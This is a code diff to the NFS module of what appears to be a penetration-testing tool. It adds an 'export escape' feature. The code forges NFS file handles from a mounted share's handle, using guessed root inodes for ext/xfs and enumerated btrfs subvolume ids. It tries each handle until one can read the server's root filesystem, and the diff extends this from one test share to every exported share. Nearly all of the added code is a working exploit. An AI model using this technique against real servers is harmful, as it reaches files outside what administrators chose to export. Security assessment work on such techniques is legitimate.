@@ -21,6 +21,52 @@ import os
 from pprint import pprint
 
 
+class FileID:
+    root = "root"
+    ext = "ext/xfs"
+    btrfs = "btrfs"
+    udf = "udf"
+    nilfs = "nilfs"
+    fat = "fat"
+    lustre = "lustre"
+    kernfs = "kernfs"
+    invalid = "invalid"
+    unknown = "unknown"
+
+
+# src: https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/exportfs.h#L25
+fileid_types = {
+    0: FileID.root,
+    1: FileID.ext,
+    2: FileID.ext,
+    0x81: FileID.ext,
+    0x4d: FileID.btrfs,
+    0x4e: FileID.btrfs,
+    0x4f: FileID.btrfs,
+    0x51: FileID.udf,
+    0x52: FileID.udf,
+    0x61: FileID.nilfs,
+    0x62: FileID.nilfs,
+    0x71: FileID.fat,
+    0x72: FileID.fat,
+    0x97: FileID.lustre,
+    0xfe: FileID.kernfs,
+    0xff: FileID.invalid
+}
+
+# src: https://elixir.bootlin.com/linux/v6.13.4/source/fs/nfsd/nfsfh.h#L17-L45
+fsid_lens = {
+    0: 8,
+    1: 4,
+    2: 12,
+    3: 8,
+    4: 8,
+    5: 8,
+    6: 16,
+    7: 24,
+}
+
+
 class nfs(connection):
     def __init__(self, args, db, host):
         self.protocol = "nfs"
@@ -402,66 +448,70 @@ class nfs(connection):
         else:
             self.logger.highlight(f"File {local_file_path} successfully uploaded to {remote_file_path}")
 
-    class FileID:
-        root = "root"
-        ext = "ext/xfs"
-        btrfs = "btrfs"
-        udf = "udf"
-        nilfs = "nilfs"
-        fat = "fat"
-        lustre = "lustre"
-        kernfs = "kernfs"
-        invalid = "invalid"
-        unknown = "unknown"
-
-    fileid_types = {
-        0: FileID.root,
-        1: FileID.ext,
-        2: FileID.ext,
-        0x81: FileID.ext,
-        0x4d: FileID.btrfs,
-        0x4e: FileID.btrfs,
-        0x4f: FileID.btrfs,
-        0x51: FileID.udf,
-        0x52: FileID.udf,
-        0x61: FileID.nilfs,
-        0x62: FileID.nilfs,
-        0x71: FileID.fat,
-        0x72: FileID.fat,
-        0x97: FileID.lustre,
-        0xfe: FileID.kernfs,
-        0xff: FileID.invalid
-    }
-
-    fsid_lens = {
-        0: 8,
-        1: 4,
-        2: 12,
-        3: 8,
-        4: 8,
-        5: 8,
-        6: 16,
-        7: 24,
-    }
-
     def get_root_handles(self, mount_fh):
         """
-        Get the root handle of the NFS share
+        Get possible root handles to escape to the root filesystem
         Sources: 
-        https://github.com/spotify/linux/blob/master/include/linux/nfsd/nfsfh.h
+        https://elixir.bootlin.com/linux/v6.13.4/source/fs/nfsd/nfsfh.h#L47-L62
+        https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/exportfs.h#L25
         https://github.com/hvs-consulting/nfs-security-tooling/blob/main/nfs_analyze/nfs_analyze.py
 
         Usually:
         - 1 byte: 0x01 fb_version
-        - 1 byte: 0x00 fb_auth_type, can be 0x00 (no auth) and 0x01 (some md5 auth)
-        - 1 byte: 0xXX fb_fsid_type -> determines the length of the fsid
-        - 1 byte: 0xXX fb_fileid_type
+        - 1 byte: 0x00 fb_auth_type, can be 0x00 (no auth) and 0x01 (some md5 auth), but is hardcoded to 0x00 in the linux kernel
+        - 1 byte: 0xXX fb_fsid_type -> determines the encoding (length) of the fsid, just must be preserved
+        - 1 byte: 0xXX fb_fileid_type -> determines the filesystem type
         """
-        dir_data = self.nfs3.listdir(mount_fh, auth=self.auth)
-        print(dir_data)
+        # First enumerate the directory and try to find a file/dir that contains the fid_type (4th position: handle[3])
+        # See: https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/exportfs.h#L25
+        dir_data = self.format_directory(self.nfs3.readdirplus(mount_fh, auth=self.auth))
+        filesystem = FileID.unknown
+        for entry in dir_data:
+            # Check if "." is already the root directory
+            if entry["name"] == b".":
+                if entry["name_handle"]["handle"]["data"][0] in [b"\x02", b"\x80"]:
+                    self.logger.debug("Exported share is already the root directory")
+                    return [entry["name_handle"]["handle"]["data"]]
+            elif entry["name"] == b"..":
+                continue
+            else:
+                try:
+                    fid_type = entry["name_handle"]["handle"]["data"][3]
+                    if fid_type in fileid_types:
+                        filesystem = fileid_types[fid_type]
+                        self.logger.info(f"Found filesystem type: {filesystem}")
+                        break
+                except Exception as e:
+                    self.logger.debug(f"Error on getting filesystem type: {e}")
+                    continue
+
+        self.logger.debug(f"Filesystem type: {filesystem}")
+
+        # Generate the root handle depending on the filesystem type and preserve the file_id (respect the length)
+        fh_fsid_type = mount_fh[2]
+        fh_fsid_len = fsid_lens[fh_fsid_type]
+        root_handles = []
+
+        # Generate possible root handles
+        # General syntax: 4 byte header + fsid + fileid
+        # Format for the file id see: https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/exportfs.h#L25
         fh = bytearray(mount_fh)
-        # Concatinate old header with root Inode             and Generation id
-        return bytes(fh[:3] + b"\x02" + fh[4:] + b"\x02\x00\x00\x00" + b"\x00\x00\x00\x00")
+        if filesystem in [FileID.ext, FileID.unknown]:
+            root_handles.append(bytes(fh[:3] + b"\x02" + fh[4:4+fh_fsid_len] + b"\x02\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x02\x00\x00\x00"))
+            root_handles.append(bytes(fh[:3] + b"\x02" + fh[4:4+fh_fsid_len] + b"\x80\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x80\x00\x00\x00"))
+        if filesystem in [FileID.btrfs, FileID.unknown]:
+            # Iterate over btrfs subvolumes, use 16 as default similar to the guys from nfs-security-tooling
+            for i in range(16):
+                subvolume = int.to_bytes(i) + b"\x01\x00\x00"
+                root_handles.append(bytes(fh[:3] + b"\x4d" + fh[4:4+fh_fsid_len] + b"\x00\x01\x00\x00" + b"\x00\x00\x00\x00" + subvolume + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"))
+
+        return root_handles
+
+    def try_root_escape(self, mount_fh):
+        possible_root_fhs = self.get_root_handles(mount_fh)
+        for fh in possible_root_fhs:
+            if "resfail" not in self.nfs3.readdir(fh, auth=self.auth):
+                return fh
 
     def ls(self):
         nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
@@ -473,20 +523,36 @@ class nfs(connection):
         reg = re.compile(r"ex_dir=b'([^']*)'")  # Get share names
         shares = list(reg.findall(output_export))
 
-        for share in ["/var/nfs/general"]:
+        for share in shares:
             mount_info = self.mount.mnt(share, self.auth)
             mount_fh = mount_info["mountinfo"]["fhandle"]
-            root_fh = self.get_root_handles(mount_fh)
+            root_fh = self.try_root_escape(mount_fh)
+            if not root_fh:
+                self.mount.umnt(self.auth)
+                continue
 
-            # pprint(self.nfs3.readdir(root_fh, auth=self.auth))
-
-            content = self.nfs3.readdir(root_fh, auth=self.auth)["resok"]["reply"]["entries"]
-            self.logger.success(f"Using share '{share}' for escape to root fs")
-            while content:
-                for entry in content:
-                    self.logger.highlight(f"{entry['name'].decode()}")
-                    content = entry["nextentry"] if "nextentry" in entry else None
+            self.logger.success(f"Successful escape on share: {share}")
+            content = self.format_directory(self.nfs3.readdir(root_fh, auth=self.auth))
+            for entry in content:
+                self.logger.highlight(f"{entry['name'].decode()}")
             self.mount.umnt(self.auth)
+            break
+
+    def format_directory(self, raw_directory):
+        """Convert the chained directory entries to a list of the entries"""
+        if "resfail" in raw_directory:
+            self.logger.debug("Insufficient Permissions, NFS returned 'resfail'")
+            return {}
+        items = []
+        nextentry = raw_directory["resok"]["reply"]["entries"][0]
+        while nextentry:
+            entry = nextentry
+            nextentry = entry["nextentry"][0] if entry["nextentry"] else None
+            entry.pop("nextentry")
+            items.append(entry)
+
+        # Sort by name to be linux-like
+        return sorted(items, key=lambda x: x["name"].decode())
 
 
 def convert_size(size_bytes):
